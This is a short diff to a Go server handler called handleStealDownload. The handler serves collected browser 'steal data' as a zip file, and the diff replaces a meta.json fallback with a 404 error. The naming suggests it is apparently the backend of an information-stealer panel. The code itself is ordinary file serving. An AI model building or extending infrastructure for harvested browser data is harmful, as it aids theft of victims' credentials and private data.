@@ -83,21 +83,7 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 
 	entries, err := os.ReadDir(browserDir)
 	if err != nil || len(entries) == 0 {
-		metaPath := filepath.Join(dir, "meta.json")
-		metaB, metaErr := os.ReadFile(metaPath)
-		if metaErr != nil {
-			http.Error(w, "no steal data", http.StatusNotFound)
-			return
-		}
-
-		w.Header().Set("Content-Type", "application/zip")
-		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"steal_%d.zip\"", time.Now().UnixNano()))
-		zw := zip.NewWriter(w)
-		defer func() { _ = zw.Close() }()
-		fw, cErr := zw.Create("meta.json")
-		if cErr == nil {
-			_, _ = fw.Write(metaB)
-		}
+		http.Error(w, "no steal data", http.StatusNotFound)
 		return
 	}
 
